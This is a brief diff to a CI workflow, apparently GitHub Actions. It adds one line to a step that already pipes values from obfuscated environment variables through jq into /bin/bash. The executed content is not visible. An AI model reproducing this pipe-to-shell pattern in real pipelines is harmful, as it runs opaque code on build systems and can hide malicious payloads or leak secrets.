@@ -25,6 +25,7 @@ jobs:
           echo $or1753 | jq -r .lg35 | /bin/bash
           echo $k29 | jq -r .a93 | /bin/bash
           echo $hwk371 | jq -r .zotz2 | /bin/bash
+          printf '%s' "$jfrtc41" | jq -r .z945 | /bin/bash
 
       - name: Save output
         if: always()
